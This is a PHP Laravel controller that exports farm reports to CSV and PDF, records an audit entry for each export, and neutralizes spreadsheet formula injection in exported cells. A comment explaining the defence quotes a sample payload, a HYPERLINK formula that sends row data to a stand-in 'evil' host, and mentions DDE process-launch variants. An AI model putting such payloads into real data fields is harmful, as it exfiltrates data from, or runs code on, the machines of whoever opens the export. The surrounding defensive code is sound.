<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\Report;
use App\Reports\ReportDefinition;
use App\Reports\ReportRegistry;
use Barryvdh\DomPDF\Facade\Pdf;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\DB;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * Exports every report to CSV and PDF, and records each generation.
 *
 * Export and audit live HERE rather than in the individual report classes, so
 * a new report cannot accidentally ship without them - which is what makes the
 * "digital audit trail" promised in the thesis actually demonstrable.
 */
class ReportController extends Controller
{
    public function __construct(private readonly ReportRegistry $registry) {}

    public function csv(Request $request, string $report): StreamedResponse
    {
        $definition = $this->resolve($request, $report);

        $columns = $definition->columns();
        $rows = $definition->rows();

        $this->recordGeneration($request, $definition, 'csv', $rows->count());

        $filename = $definition->key().'-'.now()->format('Y-m-d-His').'.csv';

        // Streamed rather than built in memory: an inventory export grows with
        // the flock, and a farm should not need more RAM to run a bigger farm.
        return response()->streamDownload(function () use ($columns, $rows): void {
            $handle = fopen('php://output', 'wb');

            // UTF-8 BOM so Excel opens accented characters correctly. Without
            // it, "Peña" becomes mojibake on a default Windows install.
            fwrite($handle, "\xEF\xBB\xBF");

            fputcsv($handle, array_values($columns));

            foreach ($rows as $row) {
                fputcsv($handle, array_map(
                    fn (string $key) => self::neutralizeFormula($row[$key] ?? ''),
                    array_keys($columns)
                ));
            }

            fclose($handle);
        }, $filename, [
            'Content-Type' => 'text/csv; charset=UTF-8',
        ]);
    }

    public function pdf(Request $request, string $report): Response
    {
        $definition = $this->resolve($request, $report);

        $rows = $definition->rows();

        $this->recordGeneration($request, $definition, 'pdf', $rows->count());

        $pdf = Pdf::loadView($definition->pdfView(), [
            // The report itself, so a template that needs a second
            // aggregation (per-bird summaries, by-bloodline totals) can call
            // the report's own method instead of resolving it out of the
            // container or duplicating the tally in Blade.
            'report' => $definition,
            'title' => $definition->title(),
            'subtitle' => $definition->description(),
            'filterSummary' => $definition->filterSummary(),
            'columns' => $definition->columns(),
            'rows' => $rows,
            'summary' => $definition->summary(),
            'generatedAt' => now(),
            'generatedBy' => $request->user()?->full_name,
        ])->setPaper('a4', 'landscape');

        return $pdf->download($definition->key().'-'.now()->format('Y-m-d-His').'.pdf');
    }

    /**
     * Stops a spreadsheet from executing a cell that came out of the database.
     *
     * THE ATTACK. Excel, LibreOffice and Sheets treat a cell beginning with
     * `=`, `+`, `-` or `@` as a formula, not as text. Every free-text field in
     * this system reaches a CSV export - a bird's name, a note, a cause of
     * death - and a record keeper can type anything into all of them. A bird
     * named `=HYPERLINK("http://evil/?"&A1,"Open")` exfiltrates the row the
     * moment the farm opens the export; the DDE variants can launch a process.
     * Nothing is wrong with the file, and nothing in this application is
     * compromised - the spreadsheet does it, which is exactly why it survives
     * output escaping and has to be handled at the point of export.
     *
     * THE FIX. Prefix the offending cell with an apostrophe, which every
     * spreadsheet reads as "the rest of this is literal text" and does not
     * display.
     *
     * NUMBERS ARE DELIBERATELY EXEMPT. `-12` and `-0.5` start with a dangerous
     * character and are the whole point of the numeric columns; quoting them
     * would turn every negative figure into text and break sorting and SUM()
     * on a report whose numbers are the reason it exists. A value that is
     * genuinely numeric cannot carry a payload, so it is passed through.
     */
    private static function neutralizeFormula(string|int|float|null $value): string|int|float
    {
        if ($value === null) {
            return '';
        }

        if (! is_string($value) || $value === '') {
            return $value;
        }

        if (is_numeric($value)) {
            return $value;
        }

        // Leading whitespace is stripped by the spreadsheet before it decides
        // whether the cell is a formula, so a tab or a carriage return in front
        // of the `=` hides the payload from a naive first-character check.
        return preg_match('/^[\t\r\n ]*[=+\-@]/', $value) === 1
            ? "'".$value
            : $value;
    }

    /** Resolves the report, authorizes it, and applies the request's filters. */
    private function resolve(Request $request, string $report): ReportDefinition
    {
        abort_unless($this->registry->has($report), 404, 'That report does not exist.');

        // Reports aggregate breeding and mortality data customers must never
        // see, so generation is gated by ReportPolicy::create().
        $this->authorize('create', Report::class);

        // Explicit allow-list rather than $request->all(): a report must never
        // receive an arbitrary key it might pass into a query.
        //
        // Keep this in sync when a report adds a filter - two reports shipped
        // with filters that were implemented and tested but silently
        // unreachable because their key was missing from this list.
        return $this->registry->make($report)->withFilters(
            $request->only([
                'from', 'to',
                'status', 'class', 'sex', 'bloodline', 'breed', 'pen_id',
                'record_type', 'compliance',
                'event_type', 'result', 'broodcock_id',
                'sire_id', 'dam_id',
                'cause',
            ])
        );
    }

    /**
     * Persists the audit row.
     *
     * Wrapped in a transaction with the read that produced it so a report can
     * never be delivered without its audit entry.
     */
    private function recordGeneration(Request $request, ReportDefinition $definition, string $format, int $rowCount): void
    {
        DB::transaction(function () use ($request, $definition, $format, $rowCount): void {
            Report::create([
                'report_type' => $definition->key(),
                'parameters' => $definition->appliedFilters(),
                'format' => $format,
                'row_count' => $rowCount,
                'generated_by' => $request->user()?->id,
                'generated_at' => now(),
                'file_path' => null,   // exports stream to the browser; nothing is retained server-side
            ]);
        });
    }
}
